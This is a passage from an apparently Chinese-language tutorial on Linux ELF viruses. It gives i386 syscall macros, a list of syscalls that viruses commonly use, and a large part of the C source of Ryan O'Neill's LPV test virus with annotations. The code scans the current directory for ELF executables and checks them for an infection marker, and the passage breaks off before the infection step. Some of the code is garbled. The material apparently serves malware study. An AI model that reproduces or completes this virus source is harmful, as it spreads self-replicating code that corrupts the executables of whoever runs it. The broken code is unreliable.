    { \
    long __res; \
    __asm__ volatile ("int $0x80" \
            : "=a" (__res) \
            : "0" (__NR_##name),"b" ((long)(arg1)),"c" ((long)(arg2)), \
              "d" ((long)(arg3)),"S" ((long)(arg4)),"D" ((long)(arg5))); \
    return(type)__res; \
    }
    #define __syscall6(type,name,type1,arg1,type2,arg2,type3,arg3,type4,arg4, \
              type5,arg5,type6,arg6) \
    type name (type1 arg1,type2 arg2,type3 arg3,type4 arg4,type5 arg5,type6 arg6) \
    { \
    long __res; \
    __asm__ volatile ("push %%ebp ; movl %%eax,%%ebp ; movl %1,%%eax ; int $0x80 ; pop %%ebp" \
            : "=a" (__res) \
            : "i" (__NR_##name),"b" ((long)(arg1)),"c" ((long)(arg2)), \
              "d" ((long)(arg3)),"S" ((long)(arg4)),"D" ((long)(arg5)), \
              "0" ((long)(arg6))); \
    return(type),__res; \
    }
实际上这组接口的区别只是向内核传递的参数个数不同，只有__syscall6多了栈操作。这是因为超过了五个参数就不能用寄存器来传递参数了，只能用使用栈。  
病毒程序常用的系统调用如下：
    __syscall0(int,fork);
    __syscall1(time_t, time, time_t *, t);
    __syscall1(int, close, int, fd);
    __syscall1(unsigned long, brk, unsigned long, brk);
    __syscall1(int, unlink, const char *, pathname);
    __syscall1(void, exit, int, status);
    __syscall2(int, fstat, int, fd, struct stat *, buf);
    __syscall2(int, fchmod, int, filedes, mode_t, mode);
    __syscall2(int,chmod,const char *,pathname,unsigned int,mode);
    __syscall2(int, rename, const char *, oldpath, const char *, newpath);
    __syscall3(int, fchown, int, fd, uid_t, owner, gid_t, group);
    __syscall3(int, getdents, uint, fd, struct dirent *, dirp, uint, count);
    __syscall3(int, open, const char *, file, int, flag, int, mode);
    __syscall3(off_t, lseek, int, filedes, off_t, offset, int, whence);
    __syscall3(ssize_t, read, int, fd, void *, buf, size_t, count);
    __syscall3(ssize_t, write, int, fd, const void *, buf, size_t, count);
    __syscall3(int, execve, const char *, file, char **, argv, char **, envp);
    __syscall3(pid_t, waitpid, pid_t, pid, int *, status, int, options);
## 5.LPV病毒分析
lpv病毒是《linux二进制分析》作者[Ryan
O'Neill](http://www.bitlackeys.org)用.text感染算法写的linux32位下的测试病毒。
> 这个病毒将自己复制到它有权写入的第一个未受感染的可执行文件（复制也是病毒最本质的行为），它一次只复制一个可执行文件。
> 病毒会在感染的每个二进制文件中写入magic作为标记，使病毒能检测到文件是否为已被感染。 目前病毒只感染当前工作目录内的文件，但可以很容易地修改。  
>  此病毒在主机可执行文件的text段末尾扩展/创建PAGE大小的填充，然后将其自身复制到该位置。
> 原始入口点被修补到寄生代码的起点，该寄生代码在其执行后将控制权返回给主机。该代码与位置无关并通过系统调用宏避开libc。
关键部分我在下面的源码中加上了注释：
    /*
    * Linux VIRUS - 12/19/08 Ryan O'Neill
    *
    * -= DISCLAIMER =-    * This code is purely for research purposes and so that the reader may have a deeper understanding
    * of UNIX Virus infection within ELF executables. 
    *
    * Behavior:
    * The virus copies itself to the first uninfected executable that it has write permissions to, 
    * therefore the virus copies itself one executable at a time. The virus writes a bit of magic 
    * into each binary that it infects so that it knows not to re-infect it. The virus at present
    * only infects files within the current working directory, but can easily be modified.
    * 
    * This virus extends/creates a PAGE size padding at the end of the text segment within the host
    * executable, and copies itself into that location. The original entry point is patched to the
    * start of the parasite which returns control back to the host after its execution.
    * The code is position independent and eludes libc through syscall macros. 
    * 
    * Compile:
    * gcc virus.c -o virus -nostdlib
    * 
    * elfmaster[at]zoho.com
    *
    */
    #define _GNU_SOURCE
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #define PAGE_SIZE 4096
    #define BUF_SIZE 1024
    #define TMP "vx.tmp"
    void end_code(void);
    unsigned long get_eip();
    unsigned long old_e_entry;
    void end_code(void);
    void mirror_binary_with_parasite (unsigned int, unsigned char *, unsigned int,
                      struct stat, char *, unsigned long);
    extern int myend;
    extern int foobar;
    extern int real_start;
    _start() 
    {
    __asm__(".globl real_start\n"
        "real_start:\n"
        "pusha\n"
        "call do_main\n"    //跳转到do_main()
        "popa\n"
        "jmp myend\n");    //跳转到病毒体结束位置
    }
    do_main()
    {
      struct linux_dirent
      {
              long d_ino;
              off_t d_off;
              unsigned short d_reclen;
              char d_name[];
      };
      char *host;
      char buf[BUF_SIZE];
      char cwd[2];
      struct linux_dirent *d;
      int bpos;
      int dd, nread;
      unsigned char *tp;
      int fd, i, c;
      char text_found;
      mode_t mode;
      struct stat st; 
      unsigned long address_of_main = get_eip() - ((char *)&foobar - (char *)&real_start);  //动态计算main函数地址
      unsigned int parasite_size = (char *)&myend - (char *)&real_start;   //病毒体尾部地址减去开始地址为寄生代码的大小
      parasite_size += 7;  // 7为jmp_code的大小，为了能跳转回原始入口点
      unsigned long int leap_offset;
      unsigned long parasite_vaddr;
      unsigned int numbytes;
      Elf32_Shdr *s_hdr;
      Elf32_Ehdr *e_hdr;
      Elf32_Phdr *p_hdr;
      unsigned long text;
      int nc; 
      int magic = 32769;
      int m, md;
      text_found = 0;
      unsigned int after_insertion_offset;
      unsigned int end_of_text;
      char infected;
      cwd[0] = '.';
      cwd[1] = 0;
      dd = open (cwd, O_RDONLY | O_DIRECTORY);
      nread = getdents (dd, buf, BUF_SIZE);
      /*重复读取并感染当前目录下的未被感染的可执行文件*/
      for (bpos = 0; bpos d_reclen;
        host = d->d_name;
        if (host[0] == '.')  
        continue;
        if (host[0] == 'l')
        continue;
        fd = open (d->d_name, O_RDONLY); 
        stat(host, &st);
        char mem[st.st_size];
        infected = 0;
        c = read (fd, mem, st.st_size);
        e_hdr = (Elf32_Ehdr *) mem;
        if (e_hdr->e_ident[0] != 0x7f && strcmp (&e_hdr->e_ident[1], "ELF"))  //判断文件是否为一个elf可执行文件 
        {
              close (fd);
              continue;
        }
        else 
        {
            p_hdr = (Elf32_Phdr *) (mem + e_hdr->e_phoff);
        for (i = e_hdr->e_phnum; i-- > 0; p_hdr++)
        {
            if (p_hdr->p_type == PT_LOAD)
            {
                if (p_hdr->p_flags == (PF_R | PF_X))
                {    
                    md = open(d->d_name, O_RDONLY);
                    unsigned int pt = (PAGE_SIZE - 4) - parasite_size;
                    lseek(md, p_hdr->p_offset + p_hdr->p_filesz + pt, SEEK_SET);
                    read(md, &m, sizeof(magic));
                    if (m == magic)  //通过magic标记判断已感染的文件
                        infected++; 
                    close(md);
                    break;
                }
            }
        }
        } 